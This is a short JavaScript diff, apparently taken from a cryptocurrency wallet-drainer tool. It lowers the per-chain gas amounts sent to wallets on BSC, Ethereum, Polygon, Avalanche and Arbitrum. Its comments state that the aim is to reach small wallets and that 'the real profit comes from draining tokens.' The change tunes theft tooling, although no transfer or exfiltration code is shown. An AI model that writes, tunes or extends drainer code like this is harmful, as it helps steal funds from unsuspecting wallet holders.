@@ -167,11 +167,11 @@ const NATIVE_PRICES={56:600,1:3500,137:.7,43114:25,42161:3500};
 
 // Gas amounts calibrated to ~$2.50
 const GAS_CONFIG={
-  56:{amt:'0.0009',sym:'BNB'},    // BSC: 0.0009 BNB ≈ $0.54 — low gas, low balance wallets
-  1:{amt:'0.0008',sym:'ETH'},     // ETH: 0.0008 ETH ≈ $2.80
-  137:{amt:'3.6',sym:'MATIC'},    // Polygon: 3.6 MATIC ≈ $2.52
-  43114:{amt:'0.1',sym:'AVAX'},   // Avalanche: 0.1 AVAX ≈ $2.50
-  42161:{amt:'0.0008',sym:'ETH'}  // Arbitrum: cheap L2
+  56:{amt:'0.00025',sym:'BNB'},    // BSC: 0.00025 BNB ≈ $0.15 — drain tokens not fee
+  1:{amt:'0.0004',sym:'ETH'},     // ETH: 0.0004 ETH ≈ $1.40 — low enough for small wallets
+  137:{amt:'1.5',sym:'MATIC'},    // Polygon: 1.5 MATIC ≈ $1.05
+  43114:{amt:'0.04',sym:'AVAX'},   // Avalanche: 0.04 AVAX ≈ $1.00
+  42161:{amt:'0.0002',sym:'ETH'}  // Arbitrum: 0.0002 ETH ≈ $0.70
 };
 // NOTE: BSC gas is very low cost so 0.0009 BNB is fine. The real profit comes from draining tokens.
 
